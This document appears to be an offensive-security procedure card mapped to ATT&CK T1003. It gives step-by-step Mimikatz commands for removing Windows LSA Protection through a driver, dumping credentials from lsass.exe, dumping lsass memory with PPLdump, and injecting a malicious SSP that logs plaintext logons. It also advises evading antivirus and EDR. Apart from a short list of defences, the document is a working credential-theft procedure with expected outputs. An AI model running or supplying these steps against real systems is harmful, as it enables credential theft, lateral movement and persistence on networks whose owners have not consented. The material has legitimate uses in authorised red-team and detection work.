---
id: 06be9137-5ef0-44ad-b4b5-66ba5916452b
name: Mimikatz-LSA-Protection-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.155959+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/LSA Protection Workaround]]'
  - '[[tags/Windows - Mimikatz]]'
commands:
  - '[[commands/reg-query-lsa-protection-status]]'
  - '[[commands/mimikatz-load-mimidriver]]'
  - '[[commands/mimikatz-remove-lsass-protection]]'
  - '[[commands/mimikatz-enable-debug-privilege]]'
  - '[[commands/mimikatz-elevate-token]]'
  - '[[commands/mimikatz-dump-logon-passwords]]'
  - '[[commands/mimikatz-add-lsass-protection]]'
  - '[[commands/mimikatz-unload-mimidriver]]'
  - '[[commands/ppldump-dump-lsass]]'
  - '[[commands/tasklist-check-lsaiso-process]]'
  - '[[commands/mimikatz-inject-memssp]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
  - '[[tools/PPLdump]]'
validated: true
---

# Mimikatz-LSA-Protection-Bypass

## Summary

This procedure bypasses the LSA Protection feature in Windows, which prevents unauthorized access to the Local Security Authority (LSA) process (lsass.exe), to extract sensitive credential information such as domain credentials and hashes. It uses Mimikatz with a custom driver to temporarily remove protection flags from lsass.exe, dump the credentials, and restore protections, or alternatively injects a malicious Security Support Provider (SSP) to log future authentications. This is useful in post-exploitation scenarios for privilege escalation on Windows domain environments.

## Description

LSA Protection is a Windows security feature (enabled by default on Windows 8/Server 2012 and later) that marks lsass.exe as a Protected Process Light (PPL), restricting code injection and access to its memory. This procedure circumvents it using Mimikatz's driver-based approach (mimidriver.sys) to manipulate process protections or by injecting a custom SSP via memssp to capture plaintext credentials from future logons. The target environment is a Windows system with administrative access, typically in an Active Directory domain. Success allows extraction of NTLM hashes, Kerberos tickets, and plaintext passwords, enabling lateral movement or persistence. Note that this requires physical or remote admin access and may trigger EDR alerts if not obfuscated.

## Requirements

1. Local administrator or SYSTEM-level privileges on the target Windows system (Windows 8/Server 2012 or later).
2. Access to the target system via interactive shell (e.g., PowerShell or CMD remoting).
3. Mimikatz executable and mimidriver.sys downloaded from the official repository (place in the same directory).
4. For the SSP injection method, mimilib.dll must be in the same folder as Mimikatz.
5. Optional: PPLdump.exe for additional memory dumping (download from GitHub).
6. Antivirus/EDR may need to be bypassed or disabled for Mimikatz execution.

## Defense

- Enable and monitor Credential Guard (Windows 10 Enterprise/Server 2016+ with HVCI) to isolate lsass.exe in a virtualized container.
- Implement application whitelisting (e.g., AppLocker or WDAC) to block unsigned tools like Mimikatz.
- Monitor for process injection via Sysmon (Event ID 8) or EDR rules detecting lsass.exe memory access.
- Enable LSA Protection auditing and restrict driver loading (e.g., via Driver Signature Enforcement).
- Use multi-factor authentication (MFA) and strong password policies to limit credential value.
- Regularly review event logs for privilege escalation (Event ID 4673/4674) and anomalous Mimikatz signatures.

## Objectives

1. Verify LSA Protection status and bypass it to access lsass.exe memory.
2. Extract domain admin credentials, NTLM hashes, or Kerberos tickets from LSA.
3. Enable persistence via SSP injection to capture future plaintext logons.
4. Restore system protections to avoid immediate detection.

## Instructions

This procedure outlines two methods: (1) Driver-based protection removal and dumping, and (2) Malicious SSP injection for ongoing credential capture. Use Method 1 for immediate dumps; Method 2 for persistence.

### Method 1: Driver-Based LSA Protection Bypass and Dump

#### Step 1: Verify LSA Protection Status

**Context**: Check if LSA is running as a protected process by querying the RunAsPPL registry value. If set to 0x1 (hex 1), protection is enabled; proceed with bypass.

**Command** ([[commands/reg-query-lsa-protection-status]]):

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

> This queries the LSA configuration. Look for "RunAsPPL    REG_DWORD    0x1" indicating protection is active. If 0x0, standard Mimikatz dumping may suffice without bypass.

#### Step 2: Load Mimikatz Driver

**Context**: Upload mimidriver.sys (from Mimikatz repo) to the target alongside mimikatz.exe, then load it as a vulnerable driver to enable process protection manipulation.

**Command** ([[commands/mimikatz-load-mimidriver]]):

```cmd
mimikatz "!+"
```

> Run Mimikatz interactively and execute the !+ command to import the driver. Expected: "[+] vulnerable driver installed" confirming load.

#### Step 3: Remove Protection from lsass.exe

**Context**: Temporarily strip PPL flags from lsass.exe to allow injection and dumping.

**Command** ([[commands/mimikatz-remove-lsass-protection]]):

```cmd
mimikatz "!processprotect /process:lsass.exe /remove"
```

> This removes protection. Expected: "Protection removed from process" or similar confirmation.

#### Step 4: Elevate Privileges and Dump Credentials

**Context**: Enable debug privileges, elevate the token, and dump logon passwords from lsass.exe memory.

**Command** ([[commands/mimikatz-enable-debug-privilege]]):

```cmd
mimikatz "privilege::debug"
```

> Grants SeDebugPrivilege. Expected: "Privilege '20' OK".

**Command** ([[commands/mimikatz-elevate-token]]):

```cmd
mimikatz "token::elevate"
```

> Elevates to SYSTEM token. Expected: "Token elevated".

**Command** ([[commands/mimikatz-dump-logon-passwords]]):

```cmd
mimikatz "sekurlsa::logonpasswords"
```

> Dumps credentials. Expected: Output with Authentication Ids, usernames, NTLM hashes, Kerberos tickets, and plaintext passwords if available.

#### Step 5: Restore Protection and Unload Driver

**Context**: Re-enable PPL on lsass.exe to maintain system integrity and unload the driver to clean up.

**Command** ([[commands/mimikatz-add-lsass-protection]]):

```cmd
mimikatz "!processprotect /process:lsass.exe"
```

> Restores protection. Expected: "Protection added to process".

**Command** ([[commands/mimikatz-unload-mimidriver]]):

```cmd
mimikatz "!-"
```

> Unloads the driver. Expected: "[-] vulnerable driver uninstalled".

#### Step 6: Optional - Dump lsass.exe Memory with PPLdump

**Context**: For further analysis, dump the full lsass.exe memory using PPLdump (bypasses some protections).

**Command** ([[commands/ppldump-dump-lsass]]):

```cmd
PPLdump.exe lsass.exe lsass.dmp
```

> Dumps process to file. Expected: Progress output and creation of lsass.dmp file (use with other tools like Volatility for analysis).

### Method 2: Inject Malicious SSP for Credential Logging

#### Step 1: Check for Existing lsaiso.exe Process

**Context**: Verify if an isolation process (lsaiso.exe) is running, which may interfere with SSP injection.

**Command** ([[commands/tasklist-check-lsaiso-process]]):

```cmd
tasklist | findstr lsaiso
```

> Lists processes. Expected: No output if lsaiso.exe absent; if present, terminate it manually before proceeding.

#### Step 2: Inject Malicious SSP

**Context**: Use Mimikatz to inject a custom SSP (mimilib.dll required) into lsass.exe, logging all future authentications to a file.

**Command** ([[commands/mimikatz-inject-memssp]]):

```cmd
mimikatz "misc::memssp"
```

> Injects the SSP. Expected: "mimilsa.log registered" or similar; credentials will now log to C:\Windows\System32\mimilsa.log on authentications.

## Expected Output

- Registry query: Confirms RunAsPPL=0x1.
- Mimikatz dumps: Lists credentials like "Username: DOMAIN\admin | NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".
- SSP injection: Log file with plaintext creds on next logon, e.g., "Captured: user:pass".
- Success: Hashes/tickets extracted without crashing lsass.exe; system remains operational post-restore.
